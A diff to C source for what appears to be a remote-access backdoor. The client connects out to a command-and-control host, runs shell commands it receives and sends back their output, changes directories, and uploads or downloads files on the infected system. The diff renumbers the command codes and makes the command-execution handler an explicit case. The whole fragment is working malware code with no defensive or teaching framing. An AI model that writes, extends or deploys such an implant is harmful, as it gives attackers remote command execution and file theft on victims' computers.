@@ -61,6 +61,7 @@ inline uint32_t ntohl_conv(char const* num)
 	return ntohl(new);
 }
 
+
 // Function to receive file from client (TCP file transfer).
 int recv_file(char *buf, char* filename, SOCKET connect_socket) {
 	FILE* fd = fopen(filename, "wb");
@@ -92,7 +93,6 @@ int send_file(char *filename, SOCKET connect_socket, char *buf) {
 
 	uint32_t bytes = 0;
 	size_t f_size = 0;
-
 	if (fd) {
 		fseek(fd, 0L, SEEK_END);
 		f_size = ftell(fd);
@@ -136,7 +136,6 @@ int exec_cmd(SOCKET connect_socket, char *buf) {
 	// Read & send pipe's stdout.
 	int rb, iResult = 1;
 	rb = fread(buf, 1, BUFLEN, fpipe);
-
 	if (rb) {
 		do {
 			iResult = send(connect_socket, buf, rb, 0);
@@ -163,7 +162,7 @@ int main(void) {
 		SOCKET connect_socket = create_socket();
 
 		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-           	   occurs (connection lost, etc) break the loop and reconnect & restart loop. */
+           occurs (connection lost, etc) break the loop and reconnect & restart loop. */
 		if (connect_socket != INVALID_SOCKET) {
 			int iResult = c2_connect(connect_socket, host, port);
 			while (iResult > 0) {
@@ -176,22 +175,23 @@ int main(void) {
 				// buf[0] is the command code and &buf[1] is the parsed data.
 				switch (buf[0]) {
 					case '0':
+						iResult = exec_cmd(connect_socket, &buf[1]);
+						break;
+					case '1':
 						// Change directory.
 						_chdir(&buf[1]);
 						break;
-					case '1':
+					case '2':
 						// Exit.
 						return 0;
-					case '2':
+					case '3':
 						// Upload file to client system.
 						iResult = recv_file(buf, &buf[1], connect_socket);
 						break;
-					case '3':
+					case '4':
 						// Download file from client system.
 						iResult = send_file(&buf[1], connect_socket, buf);
 						break;
-					default:
-						iResult = exec_cmd(connect_socket, buf);
 				}
 			}
 		}
